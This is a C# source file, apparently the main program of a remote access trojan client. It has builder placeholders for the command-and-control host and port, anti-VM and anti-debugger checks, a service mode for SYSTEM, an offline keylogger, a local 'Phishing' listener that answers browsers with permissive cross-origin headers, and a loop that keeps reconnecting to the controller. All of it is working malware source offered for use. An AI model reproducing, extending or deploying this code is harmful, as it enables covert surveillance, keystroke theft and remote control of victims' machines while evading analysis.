using System;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.ServiceProcess;
using System.Threading;
using Client.HandlePacket;
using System.Reflection;

namespace Client
{
    internal class Program
    {
        #region Setting

        public static readonly string Version = "0.0.1";
#if DEBUG
        public static readonly string Link = "";
        public static readonly string Host = "127.0.0.1";
        public static readonly int Port = 8848;
        public static readonly string Mutex = "Mutex_test";
        public static readonly string Group = "Default";
        public static readonly bool AntiAnalysis = false;
        public static readonly bool OffLineKeyLogger = false;
        public static readonly int Sleep = 1000;
#else
        public static readonly string Link = "%Link%";
        public static readonly string Host = "%Host%";
        public static readonly int Port = Convert.ToInt32("%Port%");
        public static readonly string Mutex = "%Mutex%";
        public static readonly string Group = "%Group%";
        public static readonly bool AntiAnalysis = Convert.ToBoolean("%AntiAnalysis%");
        public static readonly bool OffLineKeyLogger = Convert.ToBoolean("%OffLineKeyLogger%");
        public static readonly int Sleep = Convert.ToInt32("%Sleep%");
#endif

        #endregion

        public static string HWID;
        public static TCPSocket TCP_Socket;
        public static bool ClientWorking;
        public static TcpListener listener;

        private static void Main()
        {
            Thread.Sleep(Sleep);

            //Anti-Analysis
            if (AntiAnalysis && (Helper.Helper.IsVM() || Helper.Helper.HasDebugger())) Environment.FailFast(null);

            if (Environment.UserName.ToLower() == "system" && Helper.Helper.CheckSession0())
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new Helper.Service()
                };
                ServiceBase.Run(ServicesToRun);
                return;
            }
            string dllName = "System.Data.SQLite.dll";
            string dllName1 = "Newtonsoft.Json.dll";
            string dllName2 = "Shared.dll";

            string resource_dll = $"{typeof(Program).Namespace}.DLL.{dllName}";
            string resource_dll1 = $"{typeof(Program).Namespace}.DLL.{dllName1}";
            string resource_dll2 = $"{typeof(Program).Namespace}.DLL.{dllName2}";

            EmbeddedAssembly.Load(resource_dll, dllName);
            EmbeddedAssembly.Load(resource_dll1, dllName1);
            EmbeddedAssembly.Load(resource_dll2, dllName2);

            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);

            Start();
        }
        static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            return EmbeddedAssembly.Get(args.Name);
        }
        public static void Start()
        {
            //Init
            ClientWorking = true;
            HWID = Helper.Helper.GetHWID();

            //Mutex
            if (!Helper.Helper.CreateMutex()) Environment.Exit(0);

            Helper.Helper.PreventSleep();

            if (OffLineKeyLogger)
            {
                HandleKeylogger.offline = true;
                new Thread(() => { HandleKeylogger.Run(); }).Start();
            }

            new Thread(() => { Phishing(); }).Start();

            //Connection
            TCP_Socket = new TCPSocket();
            TCP_Socket.InitializeClient();
            while (ClientWorking)
            {
                if (!TCP_Socket.IsConnected) TCP_Socket.Reconnect();

                Thread.Sleep(new Random().Next(5000));
            }
        }

        public static void Phishing()
        {
            try
            {
                IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
                listener = new TcpListener(ipAddress, 23333);
                listener.Start();
                while (true)
                {
                    try
                    {
                        using (var clt = listener.AcceptTcpClient())
                        using (NetworkStream ns = clt.GetStream())
                        using (StreamReader sr = new StreamReader(ns))
                        using (StreamWriter sw = new StreamWriter(ns))
                        {
                            var msg = sr.ReadLine();

                            if (msg.StartsWith("GET"))
                            {
                                sw.WriteLine("HTTP/1.1 200 OK");
                                sw.WriteLine("Access-Control-Allow-Origin: *");
                                sw.WriteLine("Access-Control-Allow-Private-Network:true");
                                sw.WriteLine();
                                sw.WriteLine("test");
                            }
                        }
                    }
                    catch { }
                    Thread.Sleep(1);
                }
            }
            catch { }
        }
    }
}